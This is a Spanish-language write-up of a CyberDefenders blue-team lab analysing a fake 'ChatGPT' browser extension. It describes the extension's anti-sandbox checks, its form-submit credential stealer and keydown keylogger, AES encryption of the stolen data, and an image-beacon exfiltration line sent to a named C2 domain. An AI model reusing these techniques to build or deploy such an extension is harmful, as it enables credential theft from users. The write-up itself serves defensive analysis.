# 🔍 FakeGPT Lab WriteUp – Malware Analysis (CyberDefenders)

## 🧩 Escenario del Laboratorio

**Contexto**: Varios empleados reportan comportamiento inusual en sus navegadores tras instalar una extensión llamada "ChatGPT". Cuentas comprometidas y fuga de información sensible activan una alerta en el SOC.  
**Objetivo**: Analizar los componentes de la extensión maliciosa, identificar mecanismos de robo de datos, técnicas de exfiltración encubierta y anti-análisis.  
**Herramientas**: ExtAnalysis, CRX Viewer.  
**Tácticas**: Credential Access | Collection | Command and Control | Exfiltration.

El laboratorio provee los archivos fuente de la extensión (`.js`, `.json`, `.html`, `.gif`) para análisis estático.

### 📦 Preparación del Entorno

<img width="861" height="99" alt="1" src="https://github.com/user-attachments/assets/b8d9b81c-9c9c-4440-abc4-6e4eaeeea091" />



Antes de iniciar el análisis, empaquetamos los archivos de la extensión en un archivo `.crx` para poder subirlos a ExtAnalysis y CRXViewer:

`
zip -r extension.crx app.js crypto.js loader.js manifest.json ui.html IMG.gif
`

### 📖 Análisis Preliminar – manifest.json

Antes de iniciar con las preguntas del laboratorio, realizamos un análisis del archivo `manifest.json`, el cual expone múltiples red flags desde la primera lectura.

<img width="1280" height="685" alt="2" src="https://github.com/user-attachments/assets/de5da17e-2d2b-42f9-a2fd-48429ae7a2eb" />



### **Metadata de la Extensión**

| Campo | Valor | Observación |
|-------|-------|-------------|
| name | "ChatGPT" | Impersonación de marca legítima (OpenAI) |
| version | "1.0" | Sin historial de versiones → nueva/reciente |
| manifest_version | 2 | Versión legacy (MV3 es el estándar actual) |
| description | "An AI-powered assistant" | Descripción genérica para aparentar legitimidad |

### **Permisos Declarados**

| Permiso | Capacidad | Nivel de Riesgo |
|---------|-----------|-----------------|
| tabs | Ver URLs y títulos de todas las pestañas abiertas | 🟡 Medio |
| http://*/* | Acceso completo a toda web HTTP | 🔴 Crítico |
| https://*/* | Acceso completo a toda web HTTPS | 🔴 Crítico |
| storage | Persistir datos localmente en el navegador | 🟡 Medio |
| webRequest | Interceptar y monitorear todas las peticiones de red | 🔴 Crítico |
| webRequestBlocking | Modificar o bloquear peticiones en tiempo real | 🔴 Crítico |
| cookies | Leer, escribir y robar cookies de cualquier sitio | 🔴 Crítico |

> La combinación `webRequestBlocking + cookies + <all_urls>` habilita un ataque **Man-in-the-Browser** completo, permitiendo interceptar credenciales, secuestrar sesiones y modificar respuestas del servidor antes de que lleguen al usuario.

### **Componentes de la Extensión**

**Background Script** (`system/loader.js`)
```json
"background": {
    "scripts": ["system/loader.js"],
    "persistent": true
}
```
Corre permanentemente desde el inicio del navegador (`persistent: true`). El path `system/` intenta aparentar ser un componente legítimo del sistema operativo. Es el componente de carga del payload principal, por lo tanto es el **primer archivo a analizar en profundidad**.

**Content Script** (`core/app.js`)
```json
"content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["core/app.js"]
}]
```
Se inyecta en **absolutamente todas las páginas web** visitadas por el usuario. Tiene acceso directo al DOM, pudiendo leer formularios, inputs y contraseñas. La directiva `<all_urls>` elimina toda restricción de dominio, cubriendo banking, email, redes sociales, etc.

Simplemente leyendo el `manifest.json` en su forma cruda, ya podemos identificar múltiples red flags: scripts en background con persistencia, permisos sobre todas las URLs, lectura de formularios, versión de manifest obsoleta, entre otros.

## 📋 Preguntas del Laboratorio & Respuestas

| Q1 | Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis? 
-

Posterior al análisis del `manifest.json`, nos dirigimos a examinar el archivo `app.js`. En su contenido podemos identificar una URL objetivo encodeada en **Base64**, reconocible por los caracteres `==` al final de la cadena. Al decodear en CyberChef, confirmamos que se trata de `www.facebook.com`, lo que indica que la extensión implementa un listener específicamente orientado a ese dominio para interceptar la actividad del usuario.  

<img width="1280" height="686" alt="image" src="https://github.com/user-attachments/assets/20491f03-e5bc-41d6-a738-85924734e131" />



**R:** `Base64`

-----

| Q2 | Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?   
-

Resultado directo de la decodificación Base64 realizada en la pregunta anterior. La URL objetivo hardcodeada en el código de `app.js` corresponde al dominio de Facebook, confirmando que la extensión fue diseñada específicamente para interceptar credenciales y sesiones de usuarios de dicha plataforma.  
<img width="1280" height="684" alt="image" src="https://github.com/user-attachments/assets/37539576-f4a7-40c1-a385-c637186a8b47" />


**R:** `www.facebook.com`

-----

| Q3 | Which type of HTML element is utilized by the extension to send stolen data?  
-

Continuando el análisis de `app.js`, podemos identificar el uso de una técnica conocida como **Image Beacon**, mediante la cual se exfiltran datos de forma encubierta a través de imágenes invisibles para el usuario. El flujo de exfiltración funciona de la siguiente manera:  
1. Se crea un elemento `<img>` invisible en el DOM.  
2. Al asignar `img.src`, el navegador realiza automáticamente: `GET https://Mo.Elshaheedy.com/collect?data=[credenciales_cifradas_AES]`.  
3. El servidor C2 recibe las credenciales en el query string de la request.  
4. Responde con `204 No Content` o una imagen 1x1px transparente.  
5. El usuario no percibe ninguna actividad anómala en ningún momento.

<img width="1280" height="686" alt="image" src="https://github.com/user-attachments/assets/47a4d8f2-82df-43c4-acbd-cba0a373eb79" />


  
**R:** `<img>`

---

| Q4 | What is the first specific condition in the code that triggers the extension to deactivate itself?  
-

Trasladando el análisis al archivo `loader.js`, identificamos que este cumple dos funciones principales: **Anti-Analysis** y **Dynamic Loader**. El código evalúa dos condiciones secuenciales para detectar entornos de sandbox o análisis automatizado:  

**1ra condición** → `navigator.plugins.length === 0`  
Verifica si el navegador tiene **cero plugins instalados**. Los entornos de análisis automatizado, máquinas virtuales y sandboxes generalmente no tienen plugins registrados, por lo que esta condición activa la desactivación silenciosa de la extensión para evitar ser detectada.  

**2da condición** → `/HeadlessChrome/.test(navigator.userAgent)`  
Busca la string `"HeadlessChrome"` en el User-Agent del navegador. Chrome en modo headless (utilizado en sandboxes y pipelines de análisis automatizado) incluye esta string de forma característica, lo que permite al malware identificar y evadir estos entornos.  

Adicionalmente, este script es el encargado de cargar dinámicamente el payload principal `app.js` una vez que los controles anti-análisis son superados. 

<img width="1280" height="684" alt="image" src="https://github.com/user-attachments/assets/16f2b2f8-d77a-4235-8e9b-132baa8ad4ef" />





**R:** `navigator.plugins.length === 0`

-----

| Q5 | Which event does the extension capture to track user input submitted through forms? 
-

Retornando al análisis de `app.js`, podemos examinar el comportamiento completo del módulo de **credential stealer**. La extensión registra un event listener sobre el evento `submit` de formularios web, el cual se activa en el momento en que el usuario envía un formulario. Dicho listener captura los campos `username`, `email` y `password` únicamente si contienen contenido, para posteriormente encriptarlos y transmitirlos al servidor C2.  

<img width="1280" height="684" alt="image" src="https://github.com/user-attachments/assets/a0482995-0dbd-4510-94b5-770ba00bfa94" />


**R:** `submit`

-----

| Q6 | Which API or method does the extension use to capture and monitor user keystrokes?  
-

En `app.js` existe un módulo de **keylogger** implementado en pocas líneas pero extremadamente efectivo. Registra un event listener a nivel de documento completo sobre el evento `keydown`, capturando y registrando cada tecla presionada por el usuario independientemente del campo o contexto activo en la página, lo que lo hace aplicable a cualquier tipo de input fuera de formularios tradicionales.  

<img width="1280" height="683" alt="image" src="https://github.com/user-attachments/assets/5b0a805e-0e3c-4386-8c1d-9d94db25cf20" />



**R:** `keydown`

-----

| Q7 | What is the domain where the extension transmits the exfiltrated data?   
-

Durante el análisis del mecanismo de Image Beacon en `app.js` (Q3), pudimos observar en el código la URL completa del servidor C2 al cual se envían las credenciales e información robada mediante las requests GET encubiertas. 

<img width="1280" height="683" alt="image" src="https://github.com/user-attachments/assets/3c8cd8a1-3cad-450d-ae8c-4e48e5377425" />


**R:** `mo.elshaheedy.com`

-----

| Q8 | Which function in the code is used to exfiltrate user credentials, including the username and password?  
-

En `app.js` podemos identificar la función responsable de orquestar el proceso completo de exfiltración. Esta función construye un objeto `.JSON` con los campos `user`, `pass` y `site`, los cuales son encriptados mediante AES y posteriormente transmitidos al canal C2 a través del mecanismo de Image Beacon analizado en Q3.  

<img width="1117" height="136" alt="image" src="https://github.com/user-attachments/assets/7a72845f-873b-4277-91eb-84ed33409ac1" />



**R:** `exfiltrateCredentials(username, password)`

-----

| Q9 | Which encryption algorithm is applied to secure the data before sending?   
-

En `app.js` podemos localizar la función de cifrado que procesa el payload antes de su exfiltración. El proceso funciona de la siguiente manera: toma el objeto `.JSON` con `usuario`, `contraseña` y `sitio web`, lo cifra con **AES-CBC** utilizando un **vector de inicialización (IV)** generado aleatoriamente para garantizar que cada paquete transmitido sea único e irrepetible, y finalmente lo convierte a formato **Base64** antes de ser enviado al canal C2. Esta combinación de cifrado simétrico + IV aleatorio + encoding dificulta significativamente la detección por inspección de tráfico.  

<img width="1280" height="590" alt="image" src="https://github.com/user-attachments/assets/a5aee07c-74b8-421d-9bc7-adc16fe84315" />



**R:** `AES`

-----

| Q10 | What does the extension access to store or manipulate session-related data and authentication information?   
-

Retomando el análisis del `manifest.json`, entre los permisos declarados por la extensión podemos ver que incluye acceso explícito a las **cookies** del navegador. Las cookies de sesión son un objetivo de alto valor para los atacantes ya que permiten secuestrar sesiones autenticadas sin necesidad de conocer las credenciales del usuario. Con los permisos garantizados, esta extensión puede leer, modificar y exfiltrar cookies de sesión de cualquier dominio visitado.  

<img width="1280" height="481" alt="image" src="https://github.com/user-attachments/assets/8e4a600b-636f-498a-bbcd-af784e3a3b18" />



**R:** `cookies`


-----

## 🛡️ Proceso de CTI (Cyber Threat Intelligence)

### 1. **Reconocimiento de la Extensión**

manifest.json: MV2, persistent background, <all_urls>

Permisos críticos: webRequestBlocking + cookies + storage

Red flags inmediatas: impersonación OpenAI, versión legacy



### 2. **Análisis de Componentes Maliciosos**

loader.js → Anti-analysis + Dynamic loader

├── Check 1: navigator.plugins.length === 0

└── Check 2: /HeadlessChrome/.test(navigator.userAgent)

app.js → Credential stealer + Keylogger + Image Beacon

├── Target: www.facebook.com (Base64 encoded)

├── Events: submit (forms) + keydown (keylogger)

└── Exfil: exfiltrateCredentials() → AES-CBC → img.src C2



### 3. **Infraestructura C2**

Dominio: mo.elshaheedy.com

Método: Image Beacon (GET request via <img> invisible)

Endpoint: /collect?data=[AES-CBC+Base64 payload]

Payload: JSON {user, pass, site}



### 4. **Threat Intelligence**

Técnica evasión análisis: Anti-VM (plugins check + HeadlessChrome)

Cifrado: AES-CBC con IV aleatorio + Base64

Objetivo específico: Facebook session credentials



## 🎯 MITRE ATT&CK Mapping

| Táctica | Técnica | ID | Descripción Observada |
|---------|---------|----|-----------------------|
| Credential Access | Input Capture: Web Portal Capture | T1056.003 | Event listener `submit` captura credenciales de formularios |
| Collection | Input Capture: Keylogging | T1056.001 | Event listener `keydown` registra todas las teclas presionadas |
| Defense Evasion | Virtualization/Sandbox Evasion | T1497 | Checks `navigator.plugins` y `HeadlessChrome` en loader.js |
| Defense Evasion | Obfuscated Files or Information | T1027 | URLs target encodeadas en Base64 |
| Command and Control | Web Service | T1102 | Exfiltración via Image Beacon a mo.elshaheedy.com |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | Credenciales AES+Base64 enviadas via img.src GET request |
| Credential Access | Steal Web Session Cookie | T1539 | Permiso `cookies` para secuestro de sesiones activas |

## 🔬 Herramientas Utilizadas

🔍 Análisis de Extensión

├── ExtAnalysis → Análisis automático de extensión Chrome

├── CRX Viewer → Inspección de archivos fuente

└── CyberChef → Base64 decode de URLs ofuscadas



## 📊 Lecciones Aprendidas

1. **Manifest Review**: Auditar siempre permisos de extensiones antes de instalar → `webRequestBlocking + cookies + <all_urls>` = Man-in-the-Browser garantizado.
2. **Image Beacon Awareness**: Exfiltración via `<img>` es difícil de detectar por firewalls tradicionales ya que se disfraza de tráfico web legítimo.
3. **Anti-Analysis Detection**: Identificar checks de `navigator.plugins` y `HeadlessChrome` en scripts de extensiones es indicador directo de comportamiento malicioso.

---

> **Santiago Daniel Sandili** – SOC Analyst L1 Portfolio  
> *CyberDefenders Blue Team Lab: FakeGPT (Malware Analysis Category)*
